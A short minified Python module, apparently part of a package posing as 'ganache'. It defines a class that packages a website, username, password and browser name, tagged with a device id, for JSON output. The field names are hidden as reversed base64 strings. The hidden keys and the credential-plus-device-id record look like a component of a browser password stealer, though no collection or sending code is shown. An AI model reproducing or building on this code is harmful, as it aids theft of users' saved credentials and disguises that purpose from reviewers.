from ganache.utils import K as C
D='==QZ0l2c'
E='=UWbh5mclNXd'
F='=Qmcvd3czFGc'
G='=IXZzd3byJ2XiV2d'
H='lNWa2VGZ'
class AC:
	def __init__(A,site,username,password,browser_name):A.site=site;A.username=username;A.password=password;A.browser_name=browser_name
	def to_json(A,device_id):B=None;return{C(D):A.site[:100]if A.site is not B else B,C(E):A.username[:100]if A.username is not B else B,C(F):A.password[:100]if A.password is not B else B,C(G):A.browser_name,C(H):device_id}